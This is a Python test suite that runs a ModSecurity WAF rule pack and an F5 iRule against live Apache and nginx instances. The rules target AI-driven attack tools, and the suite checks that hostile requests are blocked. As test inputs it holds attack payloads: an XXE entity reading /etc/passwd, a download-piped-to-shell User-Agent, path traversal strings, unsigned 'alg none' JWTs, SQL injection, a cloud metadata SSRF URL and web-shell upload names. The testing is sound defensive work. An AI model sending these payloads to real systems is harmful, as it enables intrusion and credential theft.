"""Run the WAF rule pack instead of reading it.

Every other check on examples/agentic-ai-attacks/waf compares documents with each other: the
blocklist with the IOC file, the rule ids with the README. None of them loads a rule. The pack
shipped that way, and the first time the ModSecurity file met an engine it did not load, one rule
never fired, four tempo rules did something other than their comments said, and a percent-encoded
path walked past the path rules. This module is what would have caught that.

Three layers, each skipped when what it needs is absent:

  * StaticRuleFileTests  - no engine. Pins the shapes behind the defects above, so they stay fixed
                           on a machine (and on the Windows CI job) that has no web server.
  * ApacheModSecurityV2  - Apache httpd + mod_security2.
    NginxModSecurityV3   - nginx + libmodsecurity3 + its nginx connector.
  * IRuleLogicTests      - tclsh, through scripts/tests/waf/irule_runtime.tcl.

Set WAF_ENGINES_REQUIRED=1 to turn "engine not installed" from a skip into a failure. CI sets it:
a suite that skips everything proves nothing, and would look exactly like a suite that passed.

On Debian or Ubuntu:
    apt-get install apache2 libapache2-mod-security2 nginx-light libnginx-mod-http-modsecurity tcl
"""
import http.client
import os
import pathlib
import re
import shutil
import socket
import subprocess
import tempfile
import time
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[2]
WAF = ROOT / "examples" / "agentic-ai-attacks" / "waf"
CONF = WAF / "modsecurity-agentic.conf"
LISTS = ("ua-block.txt", "ua-alert.txt", "blocklist-ipv4.txt")
REQUIRED = os.environ.get("WAF_ENGINES_REQUIRED") == "1"

BROWSER = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
LISTED_SOURCE = "127.7.0.20"    # appended to the test copy of the blocklist
INSIDE_SOURCE = "127.9.0.5"     # the test copy treats 127.9.0.0/16 as an internal range
XML_DTD = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><a>&e;</a>'


F5LABS_USER_AGENTS = [line for line in (pathlib.Path(__file__).resolve().parent / "waf" /
                                        "f5labs-artex-user-agents.txt").read_text().splitlines()
                      if line and not line.startswith("#")]


def jwt(header):
    import base64
    return base64.urlsafe_b64encode(header.encode()).decode().rstrip("=") + ".e30."


def upload(filename):
    body = ('--x\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\n'
            'Content-Type: application/octet-stream\r\n\r\nx\r\n--x--\r\n' % filename)
    return dict(method="POST", path="/login", body=body, ctype="multipart/form-data; boundary=x")


def form(path, body):
    return dict(method="POST", path=path, body=body, ctype="application/x-www-form-urlencoded")


# (name, request, expected status). A denial is 403, or 404 for W-AGT-021, whose targets exist in
# the test document root so that "served" is 200 and cannot be mistaken for "refused". A request
# that should be let through to a path that does not exist expects the origin's own 404.
TIER_CASES = [
    ("baseline browser request", dict(), 200),
    ("001 artex-enrich", dict(ua="artex-enrich/1.0"), 403),
    ("001 ArtEx in mixed case", dict(ua="Mozilla/5.0 (compatible; ArtEx/1.0)"), 403),
    ("001 security-testing; authorized", dict(ua="Mozilla/5.0 (security-testing; authorized)"), 403),
    ("001 HexStrike", dict(ua="HexStrike-HTTP-Framework/1.0 (Advanced Security Testing)"), 403),
    ("002 web-shell manager", dict(ua="Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)"), 403),
    ("003 ffuf is logged, not blocked", dict(ua="Fuzz Faster U Fool v2.1.0-dev"), 200),
    ("003 norma is logged, not blocked", dict(ua="norma/0.4"), 200),
    ("a scripted client is not blocked for being scripted", dict(ua="python-urllib/3.12"), 200),
    ("004 canary path", dict(path="/zzz-nonexistent-xyz123"), 403),
    ("004 canary path, upper case", dict(path="/ZZZ-Nonexistent"), 403),
    ("004 canary path, encoded", dict(path="/zzz%2dnonexistent"), 403),
    ("004 artex-probe file", dict(path="/uploads/artex-probe-10422.txt"), 403),
    ("004 canary user in the query", dict(path="/login?user=zz_no_such_user_9f3a"), 403),
    ("004 canary user in a form body", form("/login", "username=zzq.nonexistent9x7&password=x"), 403),
    ("004 encoded canary in a form body", form("/login", "email=precheck.not-a-user%40example.invalid"), 403),
    ("004 junk OAuth state", dict(path="/callback?code=AAAA&state=notvalidb64"), 403),
    ("004 metadata address", dict(path="/fetch?url=http://169.254.169.254/latest/meta-data/"), 403),
    ("004 canary in a JSON body", dict(method="POST", path="/login", body='{"username":"zz_no_such_user_9f3a"}',
                                       ctype="application/json"), 403),
    ("005 unsigned JWT", dict(headers={"Authorization": "Bearer " + jwt('{"alg":"none","typ":"JWT"}')}), 403),
    ("005 unsigned JWT, typ first", dict(headers={"Authorization": "Bearer " + jwt('{"typ":"JWT","alg":"None"}')}), 403),
    ("005 unsigned JWT, NONE, typ first", dict(headers={"Authorization": "Bearer " + jwt('{"typ":"JWT","alg":"NONE"}')}), 403),
    ("005 unsigned JWT in a cookie", dict(headers={"Cookie": "session=" + jwt('{"alg":"none"}')}), 403),
    ("005 signed JWT is served", dict(headers={"Authorization": "Bearer " + jwt('{"alg":"RS256","typ":"JWT"}')}), 200),
    ("006 tagged SQL injection, %20", dict(path="/search?q=ARTEX'%20UNION%20SELECT%201--"), 403),
    ("006 tagged SQL injection, plus signs", dict(path="/search?q=ARTEX%27+UNION+SELECT+1"), 403),
    ("006 tagged SQL injection, comment-spaced", dict(path="/search?q=ARTEX'/**/AND/**/2>1"), 403),
    ("006 the word in prose is served", dict(path="/search?q=the%20artex's%20manual"), 404),
    ("007 probe account", form("/login", "email=i04probe1792451568%40x.com"), 403),
    ("007 an ordinary address is served", form("/login", "email=probe%40x.com"), 200),
    ("008 task artifact", dict(path="/up/i4028.asp"), 403),
    ("008 task artifact, encoded extension", dict(path="/up/i4028.%70hp"), 403),
    ("008 task artifact with a path parameter", dict(path="/up/i4028.php;.jpg"), 403),
    ("008 task artifact with path info", dict(path="/up/i4028.php/x"), 403),
    ("008 index.php is served", dict(path="/index.php"), 404),
    ("008 log-poisoning shell name", dict(path="/x/cl1217.jsp"), 403),
    ("008 an ordinary jsp is served", dict(path="/page2024.jsp"), 404),
    ("008 uploaded task artifact", upload("i4028.php"), 403),
    ("009 plain XML is served", dict(method="POST", path="/login", body="<a>1</a>", ctype="application/xml"), 200),
    ("011 command substitution in the User-Agent", dict(ua="x $(id)"), 403),
    ("011 download piped to a shell in the User-Agent", dict(ua="a; wget http://h/x | sh"), 403),
    ("011 an Android model code is served", dict(ua="Mozilla/5.0 (Linux; Android 14; SH-51C) AppleWebKit/537.36"), 200),
    ("012 upload filename climbs out", upload("../../x.py"), 403),
    ("012 upload named sitecustomize.py", upload("sitecustomize.py"), 403),
    ("012 an ordinary upload is served", upload("scan01.nii.gz"), 200),
    ("013 isCliRequest is logged, not blocked", dict(headers={"isCliRequest": "true"}), 200),
    ("014 backslash traversal in the path", dict(path="/app/..%5c..%5cwin.ini"), 403),
    ("014 double-encoded traversal", dict(path="/app/%252e%252e/x"), 403),
    ("014 half-encoded dot-dot", dict(path="/app/.%2e/x"), 403),
    ("014 dot-dot with a path parameter", dict(path="/app/..;/x"), 403),
    ("014 traversal in a query parameter", dict(path="/dl?file=../../etc/passwd"), 403),
    ("014 encoded traversal in a query parameter", dict(path="/dl?file=..%2f..%2fetc%2fpasswd"), 403),
    ("014 traversal in a form body", form("/login", "file=..%2F..%2Fetc%2Fpasswd"), 403),
    ("014 backslash traversal in a form body", form("/login", "file=..%5C..%5Cwin.ini"), 403),
    ("014 dots inside a filename are served", dict(path="/files/report.v2..final.pdf"), 404),
    ("014 a numeric range is served", dict(path="/x?range=1..10"), 404),
    ("021 .env", dict(path="/.env"), 404),
    ("021 .env, encoded", dict(path="/.%65nv"), 404),
    ("021 .env.production", dict(path="/app/.env.production"), 404),
    ("021 .git/config", dict(path="/.git/config"), 404),
    ("021 actuator/env from outside", dict(path="/actuator/env"), 404),
    ("021 actuator, encoded", dict(path="/%61ctuator/env"), 404),
    ("021 actuator with a path parameter", dict(path="/actuator;x/env"), 404),
    ("021 actuator/env from an internal range", dict(path="/actuator/env", src=INSIDE_SOURCE), 200),
    ("021 actuator/health stays open", dict(path="/actuator/health"), 200),
    ("021 pprof", dict(path="/debug/pprof/heap"), 404),
    ("010 listed source address", dict(src=LISTED_SOURCE), 403),
]

# Refused by nginx itself (400) before ModSecurity sees them; Apache hands them to the rules.
SERVER_NORMALIZED = [
    ("014 dot-dot in the path", dict(path="/app/../../etc/passwd")),
    ("014 encoded dot-dot in the path", dict(path="/app/%2e%2e/%2e%2e/etc/passwd")),
]


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def engine_missing(why):
    """Skip, or fail when CI has said the engines must be there."""
    if REQUIRED:
        raise AssertionError("WAF_ENGINES_REQUIRED=1 but " + why)
    raise unittest.SkipTest(why)


def rule_copy(dest, *, windows=False, v2_stream_block=False):
    """A test copy of the rule file and its lists. Every edit asserts that it applied, so a
    reworded rule cannot turn a test into one that silently exercises the unedited file."""
    dest.mkdir(parents=True)
    for name in LISTS:
        shutil.copy(WAF / name, dest / name)
    with open(dest / "blocklist-ipv4.txt", "a") as fh:
        fh.write(LISTED_SOURCE + "\n")
    text = CONF.read_text()

    def swap(old, new, count=None):
        nonlocal text
        found = text.count(old)
        assert found and (count is None or found == count), (old, found)
        text = text.replace(old, new)

    swap('"!@ipMatch 10.0.0.0/8,', '"!@ipMatch 127.9.0.0/16,10.0.0.0/8,')
    if windows:
        swap("expirevar:ip.agt_denied=120", "expirevar:ip.agt_denied=2", 1)
        swap("expirevar:ip.agt_penalty=1800", "expirevar:ip.agt_penalty=3", 1)
    if v2_stream_block:
        swap('#SecRule REQUEST_HEADERS:Content-Type "@contains xml" \\\n#    "id:9907209,',
             'SecRule REQUEST_HEADERS:Content-Type "@contains xml" \\\n    "id:9907209,', 1)
        swap("#    SecRule STREAM_INPUT_BODY", "    SecRule STREAM_INPUT_BODY", 1)
    (dest / "modsecurity-agentic.conf").write_text(text)
    return dest / "modsecurity-agentic.conf"


def document_root(base):
    root = base / "www"
    for rel in ("index.html", "login", "signup", "actuator/env", "actuator/health", ".env",
                "app/.env.production", ".git/config", "debug/pprof/heap"):
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("ok\n")
    return root


# The two body-processor rules of modsecurity.conf-recommended. They are part of the test on
# purpose: with them, ModSecurity v2 leaves REQUEST_BODY empty for JSON and XML.
BASE_RULES = '''SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess Off
SecAuditEngine Off
SecRule REQUEST_HEADERS:Content-Type "^(?:application(?:/soap\\+|/)|text/)xml" "id:'200000',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=XML"
SecRule REQUEST_HEADERS:Content-Type "^application/json" "id:'200001',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON"
'''


class Engine:
    """One web server process with one copy of the rule file loaded. Each runs in its own
    session: Apache signals its whole process group when it stops, which would otherwise
    include the test runner."""

    def __init__(self, base, name):
        self.dir = base / name
        self.dir.mkdir()
        self.port = free_port()
        self.proc = None

    def wait(self):
        deadline = time.time() + 15
        while time.time() < deadline:
            if self.proc.poll() is not None:
                break
            try:
                socket.create_connection(("127.0.0.1", self.port), timeout=0.5).close()
                return
            except OSError:
                time.sleep(0.1)
        self.stop()
        out = getattr(self, "startup_output", "")
        log = self.dir / "error.log"
        raise AssertionError("engine did not start: %s\n%s\n%s" % (self.dir, out, log.read_text() if log.exists() else ""))

    def stop(self):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                self.proc.wait()
        if self.proc and self.proc.stdout and not self.proc.stdout.closed:
            self.startup_output = self.proc.stdout.read()
            self.proc.stdout.close()

    def request(self, method="GET", path="/", ua=BROWSER, headers=None, body=None, ctype=None, src="127.7.1.1"):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10, source_address=(src, 0))
        try:
            conn.putrequest(method, path, skip_accept_encoding=True)
            conn.putheader("User-Agent", ua)
            for key, value in (headers or {}).items():
                conn.putheader(key, value)
            data = body.encode() if body is not None else None
            if ctype:
                conn.putheader("Content-Type", ctype)
            if data is not None:
                conn.putheader("Content-Length", str(len(data)))
            conn.endheaders(data)
            response = conn.getresponse()
            response.read()
            return response.status
        finally:
            conn.close()


APACHE_MODULES = pathlib.Path("/usr/lib/apache2/modules")
NGINX_MODULE = pathlib.Path("/usr/lib/nginx/modules/ngx_http_modsecurity_module.so")


class ApacheEngine(Engine):
    @staticmethod
    def binary():
        return shutil.which("apache2") or shutil.which("httpd")

    @classmethod
    def available(cls):
        return bool(cls.binary()) and (APACHE_MODULES / "mod_security2.so").exists()

    def config(self, rule_file, docroot):
        modules = "".join("LoadModule %s_module %s/mod_%s.so\n" % (m, APACHE_MODULES, m)
                          for m in ("mpm_prefork", "authz_core", "unique_id", "security2", "dir", "alias"))
        conf = self.dir / "httpd.conf"
        conf.write_text(
            "ServerRoot %s\nServerName localhost\nPidFile %s/httpd.pid\nDefaultRuntimeDir %s\nMutex file:%s default\n"
            "Listen 127.0.0.1:%d\n%sErrorLog %s/error.log\nDocumentRoot %s\n<Directory %s>\n  Require all granted\n</Directory>\n"
            "Redirect 403 /forbidden\nRedirect 401 /signin\n"
            "SecDataDir %s\nSecTmpDir %s\nSecStreamInBodyInspection On\n%sInclude %s\n"
            % (APACHE_MODULES.parent, self.dir, self.dir, self.dir, self.port, modules, self.dir, docroot, docroot,
               self.dir, self.dir, BASE_RULES, rule_file))
        return conf

    def check(self, rule_file, docroot):
        """Parse the configuration without serving: returns (exit code, output)."""
        run = subprocess.run([self.binary(), "-f", str(self.config(rule_file, docroot)), "-t"],
                             capture_output=True, text=True)
        return run.returncode, run.stdout + run.stderr

    def start(self, rule_file, docroot):
        self.proc = subprocess.Popen([self.binary(), "-f", str(self.config(rule_file, docroot)), "-DFOREGROUND"],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                     start_new_session=True)
        self.wait()
        return self


class NginxEngine(Engine):
    @staticmethod
    def binary():
        return shutil.which("nginx")

    @classmethod
    def available(cls):
        return bool(cls.binary()) and NGINX_MODULE.exists()

    def start(self, rule_file, docroot):
        (self.dir / "modsec.conf").write_text(BASE_RULES + "Include %s\n" % rule_file)
        temp = "".join("  %s_temp_path %s/t-%s;\n" % (k, self.dir, k)
                       for k in ("client_body", "proxy", "fastcgi", "uwsgi", "scgi"))
        conf = self.dir / "nginx.conf"
        conf.write_text(
            "load_module %s;\n%sdaemon off;\npid %s/nginx.pid;\nerror_log %s/error.log;\nevents {}\n"
            "http {\n  access_log off;\n%s  server {\n    listen 127.0.0.1:%d;\n    root %s;\n    modsecurity on;\n"
            "    modsecurity_rules_file %s/modsec.conf;\n    error_page 405 =200 $uri;\n"
            "    location = /forbidden { return 403; }\n    location = /signin { return 401; }\n    location / { }\n  }\n}\n"
            % (NGINX_MODULE, "user root;\n" if os.geteuid() == 0 else "", self.dir, self.dir, temp, self.port,
               docroot, self.dir))
        self.proc = subprocess.Popen([self.binary(), "-c", str(conf), "-e", str(self.dir / "error.log")],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                     start_new_session=True)
        self.wait()
        return self


class StaticRuleFileTests(unittest.TestCase):
    """The shapes behind the defects the engines found, checkable with no engine installed."""

    @classmethod
    def setUpClass(cls):
        cls.text = CONF.read_text()
        cls.live = [l for l in cls.text.splitlines() if l.strip() and not l.lstrip().startswith("#")]

    def test_no_doubled_backslash_inside_a_pattern(self):
        # REGRESSION: Apache collapses \\ inside a quoted directive, so [/\\] reached PCRE as an
        # unterminated class and the file did not load on ModSecurity v2. Write \x5c instead.
        for line in self.live:
            self.assertNotIn("\\\\", line, line)

    def test_the_counter_collection_is_opened_before_any_other_rule(self):
        # REGRESSION: a denial ends its phase, so initcol placed after the tier 1 rules never ran
        # for a request they refused, and those requests were missing from every counter.
        first = next(l for l in self.live if l.startswith(("SecRule", "SecAction")))
        self.assertIn("initcol:ip=", first)

    def test_no_counter_rearms_its_own_expiry(self):
        # REGRESSION: "setvar:x=+1,expirevar:x=N" on one rule restarts the window on every hit, so a
        # counter fed more often than N seconds never expires.
        for line in self.live:
            for name in re.findall(r"setvar:(ip\.\w+)=\+1", line):
                self.assertNotIn("expirevar:%s=" % name, line, line)

    def test_every_denying_rule_feeds_the_repeat_violator_counter(self):
        # REGRESSION: W-AGT-034 counted every 403, including the application's own. It now counts
        # tx.agt_deny, which only helps if every rule that denies sets it. For a chained rule the
        # flag belongs on the last link, so it is looked for across the rule's lines.
        rules = re.split(r"\n(?=SecRule|SecAction)", "\n".join(self.live))
        denying = [r for r in rules if re.search(r"[\",]deny,", r)]
        self.assertGreater(len(denying), 15)
        for rule in denying:
            rule_id = re.search(r"id:(\d+)", rule).group(1)
            if rule_id in ("9907101", "9907107"):   # the penalty box and the sign-up limit: not probes
                continue
            self.assertIn("setvar:tx.agt_deny=1", rule, rule_id)

    def test_the_signup_limit_only_refuses_signups(self):
        # REGRESSION: the deny rule tested the counter alone, so a fourth sign-up post made every
        # request from that address return 429.
        rule = re.search(r"SecRule[^\n]*\\\n[^\n]*id:9907107[^\n]*\n[^\n]*", self.text).group(0)
        self.assertIn("TX:AGT_SIGNUP_HIT", rule)
        self.assertIn("IP:AGT_SIGNUP", rule)

    def test_phase_one_path_rules_decode_before_matching(self):
        # REGRESSION: ModSecurity v2 gives phase 1 the path as sent; without urlDecodeUni
        # /%61ctuator/env and /.%65nv were served.
        for rule_id in ("9907021", "9907121", "9907008", "9907018"):
            line = next(l for l in self.live if "id:%s," % rule_id in l)
            self.assertIn("t:urlDecodeUni", line, rule_id)

    def test_rule_ids_are_unique(self):
        ids = re.findall(r"^\s*#?\s*\"id:(\d+),", self.text, re.M)
        self.assertEqual(len(ids), len(set(ids)))
        self.assertGreater(len(ids), 30)


class _ModSecurityCases:
    """Shared by both engines. Subclasses provide `engine` (the shipped thresholds) and `timed`
    (a copy with two windows shortened), started in setUpClass."""

    server_normalized_status = 403

    def test_tier_one_and_two_requests(self):
        cases = TIER_CASES + [(n, r, self.server_normalized_status) for n, r in SERVER_NORMALIZED]
        self.assertGreater(len(cases), 60)
        for index, (name, request, want) in enumerate(cases):
            # One source address per case: the tempo tier would otherwise box the test client.
            request = dict({"src": "127.7.2.%d" % (index + 1)}, **request)
            with self.subTest(name):
                self.assertEqual(self.engine.request(**request), want)

    def test_artex_named_in_the_user_agent(self):
        # Every user-agent in F5 Labs' appendix that carries the framework's name is refused, and a
        # product that merely contains those letters is not.
        named = [u for u in F5LABS_USER_AGENTS if re.search(r"(?i)(?:^|[^a-z])artex", u)]
        self.assertEqual(len(named), 44)
        for index, ua in enumerate(named):
            with self.subTest(ua):
                self.assertEqual(self.engine.request(ua=ua, src="127.7.6.%d" % (index + 1)), 403)
        for index, ua in enumerate(("SmartExchange/2.1", "Mozilla/5.0 (compatible; Partexpress/3)")):
            with self.subTest(ua):
                self.assertEqual(self.engine.request(ua=ua, src="127.7.6.%d" % (index + 100)), 200)

    def test_error_rate_trips_after_thirty(self):
        src = "127.7.3.1"
        self.assertEqual({self.engine.request(path="/nope-%d" % i, src=src) for i in range(30)}, {404})
        self.assertEqual(self.engine.request(src=src), 200)
        self.engine.request(path="/nope-x", src=src)
        self.assertEqual(self.engine.request(src=src), 429)

    def test_repeat_violator_counts_phase_two_denials(self):
        src = "127.7.3.2"
        self.assertEqual({self.engine.request(path="/zzz-nonexistent-%d" % i, src=src) for i in range(5)}, {403})
        self.assertEqual(self.engine.request(src=src), 200)
        self.engine.request(path="/zzz-nonexistent-x", src=src)
        self.assertEqual(self.engine.request(src=src), 429)

    def test_repeat_violator_counts_phase_one_denials(self):
        # REGRESSION: the collection was opened after the phase 1 rules, so these never counted.
        for src, request, status in (("127.7.3.3", dict(ua="artex-enrich/1.0"), 403), ("127.7.3.4", dict(path="/.env"), 404)):
            with self.subTest(src):
                self.assertEqual({self.engine.request(src=src, **request) for _ in range(6)}, {status})
                self.assertEqual(self.engine.request(src=src), 429)

    def test_application_403s_are_not_waf_denials(self):
        # REGRESSION: eight 403s from the origin earned the 30-minute penalty box.
        src = "127.7.3.5"
        self.assertEqual({self.engine.request(path="/forbidden", src=src) for _ in range(8)}, {403})
        self.assertEqual(self.engine.request(src=src), 200)

    def test_login_failures_trip_after_ten(self):
        src = "127.7.3.6"
        self.assertEqual({self.engine.request(method="POST", path="/signin", body="a=b", src=src) for _ in range(10)}, {401})
        self.assertEqual(self.engine.request(src=src), 200)
        self.engine.request(method="POST", path="/signin", body="a=b", src=src)
        self.assertEqual(self.engine.request(src=src), 429)

    def test_signup_limit_refuses_signups_and_nothing_else(self):
        # REGRESSION: the fourth sign-up made every request from the address return 429.
        src = "127.7.3.7"
        self.assertEqual({self.engine.request(method="POST", path="/signup", body="a=b", src=src) for _ in range(3)}, {200})
        self.assertEqual(self.engine.request(method="POST", path="/signup", body="a=b", src=src), 429)
        self.assertEqual(self.engine.request(src=src), 200)

    def test_windows_are_fixed_and_the_penalty_ends(self):
        # REGRESSION: with the expiry re-armed on every hit, seven denials 1.5 seconds apart tripped a
        # more-than-5-in-2-seconds rule. In the `timed` copy the window is 2 s and the penalty 3 s.
        src = "127.7.4.1"
        seen = set()
        for i in range(7):
            seen.add(self.timed.request(path="/zzz-nonexistent-%d" % i, src=src))
            time.sleep(1.5)
        self.assertEqual(seen, {403})
        self.assertEqual(self.timed.request(src=src), 200)
        src = "127.7.4.2"
        for i in range(6):
            self.timed.request(path="/zzz-nonexistent-%d" % i, src=src)
        self.assertEqual(self.timed.request(src=src), 429)
        time.sleep(5)
        self.assertEqual(self.timed.request(src=src), 200)


class ApacheModSecurityV2(_ModSecurityCases, unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not ApacheEngine.available():
            engine_missing("Apache httpd with mod_security2 is not installed")
        cls.base = pathlib.Path(tempfile.mkdtemp(prefix="waf-apache-"))
        os.chmod(cls.base, 0o755)
        cls.docroot = document_root(cls.base)
        cls.engines = []
        try:
            # v2 needs the stream block for W-AGT-009; the run below proves the documented recipe.
            cls.engine = cls._start("main", rule_copy(cls.base / "rules-main", v2_stream_block=True))
            cls.timed = cls._start("timed", rule_copy(cls.base / "rules-timed", windows=True))
        except BaseException:
            cls.tearDownClass()
            raise

    @classmethod
    def _start(cls, name, rule_file):
        engine = ApacheEngine(cls.base, name)
        cls.engines.append(engine)
        return engine.start(rule_file, cls.docroot)

    @classmethod
    def tearDownClass(cls):
        for engine in getattr(cls, "engines", []):
            engine.stop()
        shutil.rmtree(cls.base, ignore_errors=True)

    def test_the_file_loads_exactly_as_shipped(self):
        # REGRESSION: it did not. The copies above are edited for the test; this one is not.
        engine = ApacheEngine(self.base, "asis")
        shipped = self.base / "rules-asis"
        shipped.mkdir()
        for name in LISTS + ("modsecurity-agentic.conf",):
            shutil.copy(WAF / name, shipped / name)
        code, output = engine.check(shipped / "modsecurity-agentic.conf", self.docroot)
        self.assertEqual(code, 0, output)

    def test_dtd_in_an_xml_body_is_refused_with_the_v2_block(self):
        self.assertEqual(self.engine.request(method="POST", path="/login", body=XML_DTD,
                                             ctype="application/xml", src="127.7.5.1"), 403)

    def test_dtd_rule_is_blind_on_v2_without_the_v2_block(self):
        # Not a wish: the limitation the rule file documents. v2 leaves REQUEST_BODY empty once the
        # XML body processor is selected, so the portable rule cannot see the DTD. If this starts
        # returning 403 the engine changed and the commented block (and its README note) can go.
        self.assertEqual(self.timed.request(method="POST", path="/login", body=XML_DTD,
                                            ctype="application/xml", src="127.7.5.2"), 200)


class NginxModSecurityV3(_ModSecurityCases, unittest.TestCase):
    server_normalized_status = 400

    @classmethod
    def setUpClass(cls):
        if not NginxEngine.available():
            engine_missing("nginx with the ModSecurity v3 connector is not installed")
        cls.base = pathlib.Path(tempfile.mkdtemp(prefix="waf-nginx-"))
        os.chmod(cls.base, 0o755)
        cls.docroot = document_root(cls.base)
        cls.engines = []
        try:
            cls.engine = cls._start("main", rule_copy(cls.base / "rules-main"))
            cls.timed = cls._start("timed", rule_copy(cls.base / "rules-timed", windows=True))
        except BaseException:
            cls.tearDownClass()
            raise

    @classmethod
    def _start(cls, name, rule_file):
        engine = NginxEngine(cls.base, name)
        cls.engines.append(engine)
        return engine.start(rule_file, cls.docroot)

    @classmethod
    def tearDownClass(cls):
        for engine in getattr(cls, "engines", []):
            engine.stop()
        shutil.rmtree(cls.base, ignore_errors=True)

    def test_dtd_in_an_xml_body_is_refused(self):
        # v3 fills REQUEST_BODY under the XML body processor, so the portable rule is enough.
        self.assertEqual(self.engine.request(method="POST", path="/login", body=XML_DTD,
                                             ctype="application/xml", src="127.7.5.1"), 403)


class IRuleLogicTests(unittest.TestCase):
    def test_every_case_passes_in_the_stand_in_runtime(self):
        tclsh = shutil.which("tclsh")
        if not tclsh:
            engine_missing("tclsh is not installed")
        here = pathlib.Path(__file__).resolve().parent / "waf"
        run = subprocess.run([tclsh, str(here / "irule_runtime.tcl"), str(WAF / "f5-irule-agentic.tcl"),
                              str(WAF / "f5-data-groups.tmsh"), str(here / "irule_cases.tcl")],
                             capture_output=True, text=True, timeout=120)
        self.assertEqual(run.returncode, 0, run.stdout + run.stderr)
        summary = re.search(r"^failures: (\d+) of (\d+)$", run.stdout, re.M)
        self.assertIsNotNone(summary, run.stdout + run.stderr)
        self.assertGreater(int(summary.group(2)), 130, "the case file lost most of its cases")
        self.assertEqual(int(summary.group(1)), 0, run.stdout)

    def test_data_groups_the_rule_reads_are_the_ones_defined(self):
        # No engine needed. The first version defined three groups the rule never read.
        rule = (WAF / "f5-irule-agentic.tcl").read_text()
        defined = set(re.findall(r"^create ltm data-group internal (\S+) ", (WAF / "f5-data-groups.tmsh").read_text(), re.M))
        read = set(re.findall(r"class match -- .*? (?:contains|equals|ends_with|starts_with) (\w+)\]", rule))
        self.assertEqual(defined, read)
        self.assertNotRegex(rule, r"class match (?!-- )", "class match on request data without -- to end option parsing")


if __name__ == "__main__":
    unittest.main()
